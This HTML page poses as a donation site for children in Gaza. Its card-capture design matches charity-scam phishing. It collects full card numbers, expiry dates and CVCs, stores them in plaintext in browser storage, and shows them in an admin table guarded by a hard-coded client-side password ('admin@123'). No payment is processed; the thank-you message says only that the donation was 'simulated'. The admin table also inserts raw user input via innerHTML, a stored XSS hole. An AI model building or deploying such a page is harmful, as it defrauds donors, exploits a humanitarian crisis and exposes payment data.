<!DOCTYPE html>
<html lang="en">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>Donate to Children in Gaza</title>
    <script src="https://cdn.tailwindcss.com"></script>
    <link href="https://fonts.googleapis.com/css2?family=Inter:wght@400;500;600;700&display=swap" rel="stylesheet">
    <style>
        body {
            font-family: 'Inter', sans-serif;
            background-image: url('images/background.jpg');
            background-size: cover;
            background-position: center;
            background-attachment: fixed;
        }
        .form-input {
            @apply w-full px-4 py-3 border rounded-lg transition-colors bg-black bg-opacity-60 border-purple-400 text-white placeholder-purple-200 focus:ring-2 focus:ring-cyan-400 focus:border-cyan-400 backdrop-blur-sm;
        }
        .btn {
            @apply w-full px-6 py-3 rounded-lg text-white font-semibold transition-transform transform hover:scale-105;
        }
        .btn-primary {
            @apply bg-gradient-to-r from-cyan-500 to-purple-600 hover:from-cyan-400 hover:to-purple-500 shadow-lg shadow-cyan-500/25;
        }
        .donation-amount-btn {
            @apply w-full py-3 px-2 border rounded-lg text-center font-semibold cursor-pointer transition-colors bg-black bg-opacity-50 text-cyan-200 border-cyan-400 hover:bg-cyan-500 hover:text-black backdrop-blur-sm;
        }
        .donation-amount-btn.selected {
            @apply bg-gradient-to-r from-cyan-400 to-purple-500 text-black border-cyan-300 shadow-lg shadow-cyan-400/50;
        }
        .card-input-wrapper {
            position: relative;
            margin-bottom: 1rem;
        }
        .card-icon {
            position: absolute;
            right: 1rem;
            top: 50%;
            transform: translateY(-50%);
            width: 24px;
            height: 24px;
            color: #a78bfa; /* purple-400 */
            pointer-events: none;
        }
    </style>
</head>
<body class="flex items-center justify-center min-h-screen p-4">

    <!-- Main container for all views --><div class="w-full max-w-4xl mx-auto relative">
        <!-- Admin Link --><a href="#" id="admin-link" class="absolute top-4 right-4 text-sm text-cyan-300 hover:text-cyan-100 hover:underline z-10">Admin</a>

        <!-- Donation Form View --><div id="donation-form-container" class="w-full max-w-lg mx-auto bg-black bg-opacity-70 rounded-2xl shadow-xl overflow-hidden transition-all duration-500 backdrop-blur-sm border border-cyan-400/30">
            
            <div class="p-8">
                <div class="text-center mb-6">
                    <h1 class="text-3xl font-bold text-cyan-100">Support Children in Gaza</h1>
                    <p class="text-purple-200 mt-2">Your kindness can bring hope and relief to those in need.</p>
                </div>

                <!-- Impact Paragraph --><div class="mb-6 bg-black bg-opacity-50 p-4 rounded-lg border border-purple-400/50 backdrop-blur-sm">
                    <p class="text-cyan-100 text-sm leading-relaxed">
                        The ongoing situation in Gaza has deeply affected countless children, leaving many in urgent need of basic necessities. Your generous donation will go directly towards providing essential food to combat malnutrition, warm clothing to protect against harsh conditions, and crucial medical services for those injured or ill. Every contribution, no matter the size, helps to offer a glimmer of hope and vital support to these vulnerable children, ensuring they have a chance at a healthier and safer future. Together, we can make a profound difference in their lives.
                    </p>
                </div>

                <form id="donation-form" onsubmit="handleDonation(event)">
                    <!-- Donation Amount Section --><div class="mb-6">
                        <h2 class="text-lg font-semibold text-cyan-200 mb-3">Choose Donation Amount</h2>
                        <div class="grid grid-cols-3 md:grid-cols-5 gap-3">
                            <button type="button" class="donation-amount-btn" data-amount="1">$1</button>
                            <button type="button" class="donation-amount-btn" data-amount="25">$25</button>
                            <button type="button" class="donation-amount-btn selected" data-amount="50">$50</button>
                            <button type="button" class="donation-amount-btn" data-amount="100">$100</button>
                            <button type="button" class="donation-amount-btn" data-amount="250">$250</button>
                        </div>
                        <div class="mt-4 relative">
                            <span class="absolute left-3 top-1/2 -translate-y-1/2 text-purple-300 text-lg">$</span>
                            <input type="number" id="custom-amount" class="form-input pl-8" placeholder="Or enter a custom amount">
                        </div>
                    </div>

                    <!-- Donor Details Section --><div class="mb-6">
                        <h2 class="text-lg font-semibold text-cyan-200 mb-3">Your Details</h2>
                        <div class="space-y-4">
                            <input type="text" id="donor-name" class="form-input" placeholder="Full Name" required>
                            <input type="email" id="donor-email" class="form-input" placeholder="Email Address" required>
                        </div>
                    </div>

                    <!-- Payment Information Section --><div>
                        <h2 class="text-lg font-semibold text-cyan-200 mb-3">Payment Information</h2>
                        <div class="space-y-4">
                            <div class="card-input-wrapper">
                                <input type="text" id="card-number" class="form-input" placeholder="Card Number" required pattern="\d{4} \d{4} \d{4} \d{4}" title="Enter a 16-digit card number format.">
                                <svg class="card-icon" xmlns="http://www.w3.org/2000/svg" width="24" height="24" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2" stroke-linecap="round" stroke-linejoin="round" class="lucide lucide-credit-card"><rect width="20" height="14" x="2" y="5" rx="2"/><line x1="2" x2="22" y1="10" y2="10"/></svg>
                            </div>
                            <div class="grid grid-cols-2 gap-4">
                                <input type="text" id="expiry-date" class="form-input" placeholder="MM / YY" required pattern="(0[1-9]|1[0-2])\s?\/\s?\d{2}" title="Enter expiry in MM / YY format.">
                                <input type="text" id="cvv" class="form-input" placeholder="CVC" required pattern="\d{3,4}" title="Enter a 3 or 4 digit CVC.">
                            </div>
                        </div>
                    </div>

                    <div class="mt-8 text-center">
                        <button type="submit" class="btn btn-primary text-lg w-full max-w-sm">
                            Donate Now
                        </button>
                    </div>
                </form>
            </div>
        </div>

        <!-- Thank You Message --><div id="thank-you-message" class="w-full max-w-lg mx-auto bg-black bg-opacity-70 rounded-2xl shadow-xl p-8 text-center transition-all duration-500 hidden backdrop-blur-sm border border-cyan-400/30">
            <svg class="mx-auto h-16 w-16 text-green-500" xmlns="http://www.w3.org/2000/svg" width="24" height="24" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2" stroke-linecap="round" stroke-linejoin="round"><path d="M22 11.08V12a10 10 0 1 1-5.93-9.14"/><polyline points="22 4 12 14.01 9 11.01"/></svg>
            <h1 class="text-3xl font-bold text-cyan-100 mt-4">Thank You!</h1>
            <p class="text-purple-200 mt-2">Your generous donation has been simulated successfully.</p>
            <div class="text-left bg-black bg-opacity-50 rounded-lg p-4 mt-6 border border-purple-400/50 backdrop-blur-sm">
                <h3 class="font-semibold text-cyan-200 mb-2">Donation Summary</h3>
                <p class="text-cyan-100"><strong>Donor:</strong> <span id="summary-name"></span></p>
                <p class="text-cyan-100"><strong>Email:</strong> <span id="summary-email"></span></p>
                <p class="text-cyan-100"><strong>Amount:</strong> <span id="summary-amount"></span></p>
                <p class="text-cyan-100"><strong>Card Number (Masked):</strong> <span id="summary-card"></span></p>
            </div>
            <button onclick="showDonationView()" class="mt-6 w-full max-w-xs mx-auto btn bg-gradient-to-r from-purple-600 to-cyan-600 hover:from-purple-500 hover:to-cyan-500">Make Another Donation</button>
        </div>

        <!-- Admin View --><div id="admin-view" class="w-full max-w-4xl mx-auto bg-black bg-opacity-70 rounded-2xl shadow-xl p-8 transition-all duration-500 hidden backdrop-blur-sm border border-cyan-400/30">
            <div class="flex flex-col sm:flex-row justify-between items-start sm:items-center mb-6 gap-4">
                <h1 class="text-2xl md:text-3xl font-bold text-cyan-100">Admin Panel - Donations</h1>
                <div class="flex">
                    <button id="clear-donations-btn" class="text-sm text-white bg-gradient-to-r from-red-600 to-pink-600 hover:from-red-500 hover:to-pink-500 rounded-lg px-4 py-2 mr-2 transition-colors">Clear All</button>
                    <button id="back-to-form-btn" class="text-sm text-white bg-gradient-to-r from-cyan-600 to-purple-600 hover:from-cyan-500 hover:to-purple-500 rounded-lg px-4 py-2 transition-colors">Back to Form</button>
                </div>
            </div>
            <div class="overflow-x-auto rounded-lg border border-purple-400/50">
                <table class="min-w-full bg-black bg-opacity-50 backdrop-blur-sm">
                    <thead class="bg-black bg-opacity-70">
                        <tr>
                            <th class="py-3 px-4 border-b border-purple-400/50 text-left text-xs font-semibold text-cyan-200 uppercase tracking-wider">Donor Name</th>
                            <th class="py-3 px-4 border-b border-purple-400/50 text-left text-xs font-semibold text-cyan-200 uppercase tracking-wider">Email</th>
                            <th class="py-3 px-4 border-b border-purple-400/50 text-left text-xs font-semibold text-cyan-200 uppercase tracking-wider">Amount</th>
                            <th class="py-3 px-4 border-b border-purple-400/50 text-left text-xs font-semibold text-cyan-200 uppercase tracking-wider">Card Number</th>
                            <th class="py-3 px-4 border-b border-purple-400/50 text-left text-xs font-semibold text-cyan-200 uppercase tracking-wider">Expiry</th>
                            <th class="py-3 px-4 border-b border-purple-400/50 text-left text-xs font-semibold text-cyan-200 uppercase tracking-wider">CVC</th>
                            <th class="py-3 px-4 border-b border-purple-400/50 text-left text-xs font-semibold text-cyan-200 uppercase tracking-wider">Date</th>
                        </tr>
                    </thead>
                    <tbody id="donations-table-body" class="divide-y divide-purple-400/30">
                        <!-- Donation rows will be inserted here by JavaScript --></tbody>
                </table>
                <p id="no-donations-message" class="text-center text-purple-300 py-8 hidden">No donations have been made yet.</p>
            </div>
        </div>
    </div>
    
    <!-- Custom Modal --><div id="custom-modal" class="fixed inset-0 bg-black bg-opacity-50 flex items-center justify-center p-4 hidden z-50">
        <div class="bg-black bg-opacity-80 rounded-lg shadow-xl p-6 w-full max-w-sm text-center backdrop-blur-sm border border-cyan-400/30">
            <p id="modal-text" class="text-cyan-100 text-lg mb-6"></p>
            <div id="modal-buttons" class="flex justify-center space-x-4">
                <!-- Buttons are added dynamically by JavaScript --></div>
        </div>
    </div>

    <!-- Password Modal --><div id="password-modal" class="fixed inset-0 bg-black bg-opacity-50 flex items-center justify-center p-4 hidden z-50">
        <div class="bg-black bg-opacity-80 rounded-lg shadow-xl p-6 w-full max-w-sm backdrop-blur-sm border border-cyan-400/30">
            <h3 class="text-lg font-semibold text-cyan-100 text-center mb-4">Admin Access</h3>
            <p class="text-purple-200 text-sm text-center mb-4">Please enter the password to view donations.</p>
            <input type="password" id="admin-password-input" class="form-input mb-2" placeholder="Password">
            <p id="password-error" class="text-red-400 text-xs text-center hidden mb-4">Invalid password. Please try again.</p>
            <div class="flex justify-center space-x-4">
                 <button id="password-cancel-btn" type="button" class="px-4 py-2 bg-gradient-to-r from-gray-600 to-gray-700 text-white rounded-lg hover:from-gray-500 hover:to-gray-600 w-24">Cancel</button>
                 <button id="password-login-btn" type="button" class="px-4 py-2 bg-gradient-to-r from-cyan-600 to-purple-600 text-white rounded-lg hover:from-cyan-500 hover:to-purple-500 w-24">Login</button>
            </div>
        </div>
    </div>


    <script>
        document.addEventListener('DOMContentLoaded', function () {
            const amountButtons = document.querySelectorAll('.donation-amount-btn');
            const customAmountInput = document.getElementById('custom-amount');

            amountButtons.forEach(button => {
                button.addEventListener('click', () => {
                    amountButtons.forEach(btn => btn.classList.remove('selected'));
                    button.classList.add('selected');
                    customAmountInput.value = '';
                });
            });
            
            customAmountInput.addEventListener('input', () => {
                amountButtons.forEach(btn => btn.classList.remove('selected'));
            });

            const cardNumberInput = document.getElementById('card-number');
            cardNumberInput.addEventListener('input', (e) => {
                let value = e.target.value.replace(/\D/g, '').substring(0, 16);
                value = value.replace(/(\d{4})/g, '$1 ').trim();
                e.target.value = value;
            });

            const expiryDateInput = document.getElementById('expiry-date');
            expiryDateInput.addEventListener('input', (e) => {
                let value = e.target.value.replace(/\D/g, '').substring(0, 4);
                if (value.length > 2) {
                    value = value.substring(0, 2) + ' / ' + value.substring(2);
                }
                e.target.value = value;
            });

            // --- Admin functionality event listeners ---
            document.getElementById('admin-link').addEventListener('click', (e) => {
                e.preventDefault();
                showPasswordPrompt();
            });
            
            document.getElementById('password-login-btn').addEventListener('click', handleAdminLogin);
            document.getElementById('password-cancel-btn').addEventListener('click', () => {
                document.getElementById('password-modal').classList.add('hidden');
                document.getElementById('admin-password-input').value = '';
                document.getElementById('password-error').classList.add('hidden');
            });
            
            // Add keypress 'Enter' for password login
             document.getElementById('admin-password-input').addEventListener('keypress', function(e) {
                if (e.key === 'Enter') {
                    handleAdminLogin();
                }
            });

            document.getElementById('back-to-form-btn').addEventListener('click', showDonationView);

            document.getElementById('clear-donations-btn').addEventListener('click', () => {
                showModal(
                    'Are you sure you want to delete all donation records? This cannot be undone.', 
                    'confirm', 
                    () => {
                        localStorage.removeItem('donations');
                        populateDonationsTable();
                    }
                );
            });
        });

        function showPasswordPrompt() {
            document.getElementById('password-modal').classList.remove('hidden');
            document.getElementById('admin-password-input').focus();
        }

        function handleAdminLogin() {
            const passwordInput = document.getElementById('admin-password-input');
            const passwordError = document.getElementById('password-error');
            
            if (passwordInput.value === 'admin@123') {
                document.getElementById('password-modal').classList.add('hidden');
                passwordInput.value = '';
                passwordError.classList.add('hidden');
                showAdminView();
            } else {
                passwordError.classList.remove('hidden');
            }
        }

        function showModal(message, type = 'alert', onConfirm = null) {
            const modal = document.getElementById('custom-modal');
            const modalText = document.getElementById('modal-text');
            const modalButtons = document.getElementById('modal-buttons');

            modalText.textContent = message;
            modalButtons.innerHTML = '';

            if (type === 'confirm') {
                const cancelButton = document.createElement('button');
                cancelButton.textContent = 'Cancel';
                cancelButton.className = 'px-4 py-2 bg-gray-600 text-white rounded-lg hover:bg-gray-700 w-24';
                cancelButton.onclick = () => modal.classList.add('hidden');
                modalButtons.appendChild(cancelButton);

                const confirmButton = document.createElement('button');
                confirmButton.textContent = 'OK';
                confirmButton.className = 'px-4 py-2 bg-red-600 text-white rounded-lg hover:bg-red-700 w-24';
                confirmButton.onclick = () => {
                    modal.classList.add('hidden');
                    if (onConfirm) onConfirm();
                };
                modalButtons.appendChild(confirmButton);
            } else { // 'alert' type
                const okButton = document.createElement('button');
                okButton.textContent = 'OK';
                okButton.className = 'px-4 py-2 bg-blue-600 text-white rounded-lg hover:bg-blue-700 w-24';
                okButton.onclick = () => modal.classList.add('hidden');
                modalButtons.appendChild(okButton);
            }
            modal.classList.remove('hidden');
        }

        function handleDonation(event) {
            event.preventDefault();
            
            const name = document.getElementById('donor-name').value;
            const email = document.getElementById('donor-email').value;
            const cardNumber = document.getElementById('card-number').value;
            const expiry = document.getElementById('expiry-date').value;
            const cvv = document.getElementById('cvv').value;
            
            let amount = 0;
            const selectedAmountBtn = document.querySelector('.donation-amount-btn.selected');
            const customAmount = document.getElementById('custom-amount').value;

            if (customAmount) {
                amount = parseFloat(customAmount);
            } else if (selectedAmountBtn) {
                amount = parseFloat(selectedAmountBtn.dataset.amount);
            }

            if (amount <= 0) {
                showModal('Please select or enter a valid donation amount.');
                return;
            }

            // --- SAVE TO LOCAL STORAGE (SIMULATED DATABASE) ---
            const donationData = {
                name, 
                email,
                amount: amount.toFixed(2),
                cardNumber,
                expiry,
                cvv,
                date: new Date().toLocaleString()
            };

            const donations = JSON.parse(localStorage.getItem('donations')) || [];
            donations.unshift(donationData); // Add new donations to the top
            localStorage.setItem('donations', JSON.stringify(donations));

            // Display summary on thank you page
            document.getElementById('summary-name').textContent = name;
            document.getElementById('summary-email').textContent = email;
            document.getElementById('summary-amount').textContent = `$${amount.toFixed(2)}`;
            document.getElementById('summary-card').textContent = `**** **** **** ${cardNumber.slice(-4)}`;

            // Switch views
            document.getElementById('donation-form-container').classList.add('hidden');
            document.getElementById('thank-you-message').classList.remove('hidden');
        }
        
        function showAdminView() {
            document.getElementById('donation-form-container').classList.add('hidden');
            document.getElementById('thank-you-message').classList.add('hidden');
            document.getElementById('admin-view').classList.remove('hidden');
            populateDonationsTable();
        }

        function showDonationView() {
            document.getElementById('admin-view').classList.add('hidden');
            document.getElementById('thank-you-message').classList.add('hidden');
            document.getElementById('donation-form-container').classList.remove('hidden');
            resetForm();
        }
        
        function resetForm() {
            document.getElementById('donation-form').reset();
            document.querySelectorAll('.donation-amount-btn').forEach(btn => btn.classList.remove('selected'));
            // Select $50 as default
            document.querySelector('.donation-amount-btn[data-amount="50"]').classList.add('selected');
        }

        function populateDonationsTable() {
            const donations = JSON.parse(localStorage.getItem('donations')) || [];
            const tableBody = document.getElementById('donations-table-body');
            const noDonationsMessage = document.getElementById('no-donations-message');
            const table = noDonationsMessage.parentElement.querySelector('table');

            tableBody.innerHTML = ''; 

            if (donations.length === 0) {
                noDonationsMessage.classList.remove('hidden');
                if(table) table.classList.add('hidden');

            } else {
                noDonationsMessage.classList.add('hidden');
                if(table) table.classList.remove('hidden');
                
                donations.forEach(d => {
                    const row = document.createElement('tr');
                    row.className = 'hover:bg-purple-500/20 text-cyan-100';
                    row.innerHTML = `
                        <td class="py-3 px-4">${d.name}</td>
                        <td class="py-3 px-4">${d.email}</td>
                        <td class="py-3 px-4">$${d.amount}</td>
                        <td class="py-3 px-4 font-mono">${d.cardNumber}</td>
                        <td class="py-3 px-4 font-mono">${d.expiry}</td>
                        <td class="py-3 px-4 font-mono">${d.cvv}</td>
                        <td class="py-3 px-4 text-sm text-purple-200">${d.date}</td>
                    `;
                    tableBody.appendChild(row);
                });
            }
        }
    </script>
</body>
</html>
`



